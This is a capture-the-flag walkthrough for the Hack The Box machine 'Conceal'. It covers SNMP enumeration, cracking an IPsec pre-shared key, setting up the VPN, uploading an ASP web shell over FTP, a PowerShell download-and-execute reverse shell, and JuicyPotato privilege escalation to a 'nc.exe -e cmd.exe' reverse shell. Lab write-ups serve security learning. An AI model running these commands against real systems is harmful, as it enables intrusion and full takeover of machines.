@@ -1,0 +1,145 @@
+HTB-Conceal-Writeup
+
+IP : 10.10.10.116
+
+Nmap
+----
+- we scanned for open TCP ports with nmap and got nothing back
+- ran UDP scan and got few results to start off with
+	- 161 running SNMP
+	- 500 running ISAKMP
+
+- ISAKMP stands for Internet Security Association and Key Management protocol
+- is a framework for dynamically establishing security associations and cryptographic keys in an internet environment 
+- we can run a script scan against the UDP ports 
+- add the hostname conceal.htb to /etc/hosts file  
+
+Enumeration
+-----------
+- we have two services to enumerate SNMP and ISAKMP which is an IPSEC
+- we can start by enumerating SNMP with snmpwalk
+
+	snmpwalk -c public -v 1 conceal.htb
+
+- from the output we have a password hash for the IPSEC connection 
+
+	9C8B1A372B1878851BE2C097031B6E43
+
+- we can crack it offline or crack it with crackstation
+- we got the password 
+
+	creds : Dudecake1!
+
+- now we need to enumerate IKA VPN service to figure out how to connect to it with this password 
+- UDP 500 is used for Internet Key Exchange which is used to establish an IPSEC VPN
+- we can enumerate IKE using ike-scan
+
+	ike-scan -M 10.10.10.116
+
+- we got few details from the result
+	- Enc=3DES 
+	- Hash=SHA1 
+	- Group=2:modp1024 
+	- Auth=PSK
+	
+Connecting to VPN
+-----------------
+- with this results we can try to configure a IPSEC connection in /etc/ipsec.conf
+	
+	conn lord-to-conceal
+        authby=secret
+        auto=route
+        keyexchange=ikev1
+        ike=3des-sha1-modp1024
+        left=10.10.xx.xx
+        right=10.10.10.116
+        type=transport
+        esp=3des-sha1
+        rightprotoport=tcp
+
+- add the password to /etc/ipsec.secrets
+
+	include /var/lib/strongswan/ipsec.secrets.inc
+	10.10.14.54	10.10.10.116 : PSK "Dudecake1!"
+
+- we can start ipsec and initialize the connection 
+
+	ipsec start 
+	ipsec up lord-to-conceal
+
+- now we are connected to a vpn network
+- we tried scanning for TCP ports with nmap and got plenty
+	- 21 running FTP
+	- 80 running Microsoft IIS httpd 10.0
+	- 135 running msrpc
+	- 139 running netbios
+	- 445 running SMB
+
+Shell as destitute
+------------------
+- we have anonymous login available in FTP
+
+	ftp conceal.htb
+
+- there are no files in FTP
+- we can try uploading a test file to FTP and try to access it through web
+- directory brute force the host and we get a path
+	- /upload
+
+- on checking /upload we found the test file we uploaded to FTP
+- now lets try to put a reverse shell on FTP and get a shell out of it 
+- trying to upload an aspx reverse shell didnt work so we switched to asp
+- we can upload a simple asp shell 
+- upload shell.asp to FTP and access it through web
+
+	http://10.10.10.116/upload/shell.asp
+
+- to get an interactive shell we can use nishang Invoke-PowerShellTcp.ps1
+- name it rev.ps1
+- make necessary changed and serve it through a python web server
+- start a netcat listener 
+
+	nc -lvnp 9001
+
+- visit the following link
+
+	http://10.10.10.116/upload/shell.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.15/rev.ps1%27)
+
+- and we have a shell 
+- grab the user flag named proof.txt
+
+Priv-esc
+--------
+- on checking whoami /priv we got seImpersonatePrivilege
+
+	whoami /priv
+
+- we can use juicy potato to exploit this
+- we can run systeminfo command to know the version of windows to pick the right clsid
+- we got windows 10 Enterprise and checking it against the below link 
+
+	https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise
+
+- we get the clsid of wuauserv which is 
+
+	{e60687f7-01a1-40aa-86ac-db1cbf673334}
+
+- we can get the latest juicy potato from the following link
+
+	https://github.com/ohpe/juicy-potato/releases
+
+- upload it to the machine 
+
+	invoke-webrequest -uri http://10.10.14.54:1234/juicypotato.exe -outfile jp.exe
+
+- we created a bat file that executes the following to get a reverse shell  
+
+	nc.exe -e cmd.exe 10.10.14.54 1337
+
+- start a netcat listener 
+
+	nc -lnvp 1337
+
+- the we run the jp.exe which executes the bat file and we get a reverse shell
+- we got a shell as nt authority\system
+- grab the root flag named as proof.txt
